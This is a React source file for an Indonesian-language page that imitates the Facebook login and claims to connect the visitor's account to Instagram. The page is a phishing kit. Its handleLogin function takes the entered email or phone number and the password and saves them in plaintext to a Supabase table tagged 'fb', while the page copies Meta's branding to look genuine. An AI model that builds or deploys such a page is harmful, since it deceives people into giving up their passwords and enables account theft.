import React from "react";
import TypographyFb from "./assets/typography-fb.png";
import InstagramLogo from "./assets/ig-logo.png";

function LoginFacebook() {
  document.title = "Masuk Facebook";

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async () => {
    // Perform any validation or checks you need before inserting data into the database
    try {
      const { data, error } = await supabase
        .from("test")
        .insert([{ username: username, psw: password, acc: "fb" }])
        .select();

      // Handle success or error here
      if (error) {
        console.error("Error inserting data:", error);
      } else {
        console.log("Data inserted successfully:", data);
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <div className="bg-[#ECEFF5] min-h-screen flex flex-col items-center gap-10">
      <div className="bg-[#3B5998] py-4 flex justify-center items-center w-full">
        <img src={TypographyFb} alt="" className="w-24" />
      </div>
      <div className="text-gray-500 flex flex-col justify-center items-center max-w-sm gap-10">
        <img src={InstagramLogo} alt="" className="w-20 -mb-9" />
        <p className="text-center">
          Masuk ke akun Facebook Anda untuk terhubung dengan Instagram
        </p>
        <form action="" className="flex flex-col w-full gap-3">
          <div className="flex flex-col">
            <input
              type="email"
              placeholder="Nomor ponsel atau email"
              onChange={(e) => setUsername(e.target.value)}
              className="p-3 text-sm outline-none rounded-t-md"
            />
            <input
              type="email"
              placeholder="Kata Sandi Facebook"
              onChange={(e) => setPassword(e.target.value)}
              className="p-3 text-sm outline-none rounded-b-md border-t"
            />
          </div>
          <button
            className="font-bold text-white bg-[#1877F2] py-2.5 rounded-md"
            onClick={handleLogin}
          >
            Masuk
          </button>
        </form>
        <span className="text-sm text-blue-600">Lupa kata sandi?</span>
        <div className="text-sm text-center">
          <p>Buat Akun</p>
          <p>Lain kali</p>
          <p className="text-blue-600">Pusat Bantuan</p>
        </div>
        <div className="flex flex-row gap-20 text-sm mt-20 text-blue-800">
          <div>
            <p className="text-gray-500">Bahasa Indonesia</p>
            <p>Basa Jawa</p>
            <p>Portugese (Brasil)</p>
          </div>
          <div>
            <p>English (UK)</p>
            <p>Bahasa Melayu</p>
            <p>Espanol</p>
          </div>
        </div>
        <p className="text-xs">
          Meta <span dangerouslySetInnerHTML={{ __html: "&copy;" }} /> 2023
        </p>
      </div>
    </div>
  );
}

export default LoginFacebook;
